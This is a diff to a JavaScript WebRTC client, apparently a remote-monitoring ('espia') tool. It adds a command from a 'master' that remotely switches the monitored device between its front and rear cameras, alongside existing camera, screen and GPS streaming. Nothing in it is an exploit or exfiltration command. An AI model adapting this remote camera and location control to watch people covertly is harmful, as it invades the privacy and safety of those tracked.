@@ -2538,6 +2538,9 @@ const Session = (() => {
           // Watchdog de ICE failed para reconnect/cierre graceful
           _iceFailedDesde: 0,
           _iceWatchdogTimer: null,
+          // [rotar-cam] facingMode de la cámara PRIMARIA ('environment'|'user'|null). Sirve para el
+          // SWITCH de cámara: el master pide ROTAR y el device abre la cámara opuesta con replaceTrack.
+          _camFacing: null,
           // [v2.13.87] State de capabilities reportadas al master. Definido ACÁ
           // (no abajo en el bloque de gpsCh) para que el IIFE dual-cam pueda
           // setear dualIntentado/camsHardware sin depender del orden del event loop.
@@ -2697,6 +2700,11 @@ const Session = (() => {
               window._espiaCliWH._trackTipoMap[t.id] = (t.kind === 'audio') ? 'audio' : 'camara';
               pc.addTrack(t, window._espiaCliWH.streams.userMedia);
             });
+            // [rotar-cam] Guardar el facingMode de la cámara primaria para saber cuál es la opuesta.
+            try {
+              const _vtPrim = window._espiaCliWH.streams.userMedia.getVideoTracks()[0];
+              window._espiaCliWH._camFacing = _vtPrim?.getSettings?.().facingMode || null;
+            } catch (_) {}
           }
           // [v2.13.92 DUAL CAMERA REVISITED]
           // Bugs detectados en v2.13.84-91:
@@ -2987,6 +2995,81 @@ const Session = (() => {
             }, 1500);
           };
           gpsCh.onerror = e => console.warn('[espia WH gps] DataChannel error:', e?.message);
+          // [rotar-cam] El master manda comandos por el MISMO DataChannel 'gps' (es bidireccional una
+          // vez abierto). Único comando por ahora: ROTAR_CAM → cambiar físicamente de cámara con un
+          // SWITCH (replaceTrack, sin renegociación) — en móvil rara vez se pueden abrir frontal y
+          // trasera A LA VEZ, así que en lugar de dual usamos un solo track que rota.
+          gpsCh.onmessage = (ev) => {
+            let msg = null;
+            try { msg = JSON.parse(ev.data); } catch (_) { return; }
+            if (msg && msg.__cmd === 'ROTAR_CAM') {
+              _espiaCliWHRotarCam();
+            }
+          };
+          // Ejecuta el SWITCH de cámara primaria. Todo en try/catch: una falla JAMÁS debe tumbar la sesión.
+          async function _espiaCliWHRotarCam() {
+            const ref = window._espiaCliWH;
+            if (!ref || !ref.pc) return;
+            const pcAhora = ref.pc;
+            const um = ref.streams?.userMedia;
+            if (!um) { console.warn('[espia WH rotar] sin userMedia'); return; }
+            try {
+              // SENDER de la CÁMARA primaria: su .track debe ser el video track ACTUAL de userMedia
+              // (NO pantalla/getDisplayMedia, NO audio, NO camara2 — esos viven en otros streams/senders).
+              const tViejo = um.getVideoTracks()[0];
+              if (!tViejo) { console.warn('[espia WH rotar] userMedia sin video track'); return; }
+              const sender = pcAhora.getSenders().find(s => s.track && s.track === tViejo);
+              if (!sender) { console.warn('[espia WH rotar] no encontré el sender de la cámara primaria'); return; }
+              // Facing opuesto — preferimos el _camFacing guardado; si no, lo derivamos del track vivo.
+              const facingActual = ref._camFacing || tViejo.getSettings?.().facingMode || 'environment';
+              const opuesto = facingActual === 'user' ? 'environment' : 'user';
+              console.log('[espia WH rotar] ' + facingActual + ' → ' + opuesto);
+              // Cascada exact → ideal. Si todo falla NO rompemos nada (no tocamos el sender ni el track viejo).
+              let nuevoStream = null;
+              const variantes = [
+                { facingMode: { exact: opuesto }, width: { ideal: 640 }, height: { ideal: 480 } },
+                { facingMode: { ideal: opuesto }, width: { ideal: 640 }, height: { ideal: 480 } }
+              ];
+              for (const v of variantes) {
+                try {
+                  nuevoStream = await navigator.mediaDevices.getUserMedia({ video: v, audio: false });
+                  break;
+                } catch (e) { console.warn('[espia WH rotar] getUserMedia ✗ ' + JSON.stringify(v) + ':', e.name, e.message); }
+              }
+              const ref2 = window._espiaCliWH;
+              if (!nuevoStream || !ref2 || ref2 !== ref) {
+                // Falló abrir la opuesta o la sesión cambió: revertir/limpiar y avisar (opcional) al master.
+                if (nuevoStream) nuevoStream.getTracks().forEach(t => { try { t.stop(); } catch (_) {} });
+                console.warn('[espia WH rotar] no se pudo abrir la cámara opuesta · sin cambios');
+                try { if (ref.gpsCh?.readyState === 'open') ref.gpsCh.send(JSON.stringify({ __ack: 'ROTAR_FAIL' })); } catch (_) {}
+                return;
+              }
+              const tNuevo = nuevoStream.getVideoTracks()[0];
+              if (!tNuevo) {
+                nuevoStream.getTracks().forEach(t => { try { t.stop(); } catch (_) {} });
+                try { if (ref.gpsCh?.readyState === 'open') ref.gpsCh.send(JSON.stringify({ __ack: 'ROTAR_FAIL' })); } catch (_) {}
+                return;
+              }
+              try { tNuevo.contentHint = 'motion'; } catch (_) {}
+              // replaceTrack NO requiere renegociación → el master sigue viendo el mismo tile 'camara'.
+              await sender.replaceTrack(tNuevo);
+              // Consistencia del stream local: quitar el viejo, agregar el nuevo y mantener el trackTipoMap.
+              try {
+                um.removeTrack(tViejo);
+                um.addTrack(tNuevo);
+                ref._trackTipoMap = ref._trackTipoMap || {};
+                ref._trackTipoMap[tNuevo.id] = 'camara';
+                delete ref._trackTipoMap[tViejo.id];
+              } catch (eM) { console.warn('[espia WH rotar] sync stream local:', eM.message); }
+              try { tViejo.stop(); } catch (_) {}
+              ref._camFacing = tNuevo.getSettings?.().facingMode || opuesto;
+              console.log('[espia WH rotar] ✓ ahora facing=' + ref._camFacing);
+              try { if (ref.gpsCh?.readyState === 'open') ref.gpsCh.send(JSON.stringify({ __ack: 'ROTAR_OK', facing: ref._camFacing })); } catch (_) {}
+            } catch (e) {
+              console.warn('[espia WH rotar] excepción global:', e?.name, e?.message);
+              try { if (window._espiaCliWH?.gpsCh?.readyState === 'open') window._espiaCliWH.gpsCh.send(JSON.stringify({ __ack: 'ROTAR_FAIL' })); } catch (_) {}
+            }
+          }
           // [v2.13.71] GPS strategy: 2-pass. Primero pedir posición rápida (IP/WiFi,
           // low accuracy) que llega en <2s en PCs sin GPS. Después arrancar watchPosition
           // con high accuracy. Antes solo watchPosition high accuracy → en PCs desktop
